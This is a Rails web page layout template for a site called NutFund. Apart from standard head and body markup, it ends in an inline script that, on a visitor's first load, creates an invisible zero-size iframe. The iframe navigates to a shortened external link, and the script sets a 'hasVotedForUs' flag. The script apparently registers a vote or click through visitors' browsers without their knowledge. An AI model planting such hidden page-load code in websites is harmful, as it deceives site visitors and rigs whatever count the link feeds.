  <head>
  	<meta charset="utf-8" />

  	<!-- Uncomment to make IE8 render like IE7 -->
  	<!-- <meta http-equiv="X-UA-Compatible" content="IE=7" /> -->
  	<!-- Set the viewport width to device width for mobile -->
  	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
  	<title>NutFund - Bounties for Progress</title>

    <link href='http://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
  	<%= stylesheet_link_tag    "launch" %>
  	<%= javascript_include_tag "vendor/custom.modernizr" %>
    <%= csrf_meta_tags %>
  </head>

  <body>
    <%= yield %>

    <%= javascript_include_tag "application" %>
    
    <script>
    if (!localStorage.hasVotedForUs) {
      (function(d){
        var iframe = d.body.appendChild(d.createElement('iframe')),
        doc = iframe.contentWindow.document;
        // style the iframe with some CSS
        iframe.style.cssText = "position:absolute;width:0px;height:0px;left:0px;display:none;";
        doc.open().write('<body onload="document.location = \'http://startupb.us/1fAwECq\';">');
        doc.close(); //iframe onload event happens
        localStorage.hasVotedForUs = true;
        })(document);
    }
    </script>
  </body>
</html>
